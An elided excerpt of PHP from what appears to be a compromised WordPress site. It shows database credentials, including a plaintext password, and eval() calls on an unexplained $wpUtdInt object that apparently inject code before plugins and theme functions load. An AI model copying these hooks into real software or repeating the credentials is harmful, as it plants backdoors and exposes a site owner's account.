...
define('DB_NAME', 'lazypnlz_lazypeonsWP');

/** MySQL database username */
define('DB_USER', 'lazypnlz_lazypen');

/** MySQL database password */
define('DB_PASSWORD', 'feb4qdqb');
 ...
 */
function wp_make_clickable($ret) {
	$ret = ' ' . $ret;
...
if ( is_array($current_plugins) && !defined('WP_INSTALLING') ) {
	foreach ( $current_plugins as $plugin ) {
		...
		eval($wpUtdInt->make_compatible(WP_PLUGIN_DIR . '/' . $plugin));
	}
	unset($plugin);
}
...
if ( file_exists(TEMPLATEPATH . '/functions.php') )
	{ eval($wpUtdInt->fix_template_funcs()); include(TEMPLATEPATH . '/functions.php'); }
...
$GLOBALS['wp']->init();  // Sets up current user.
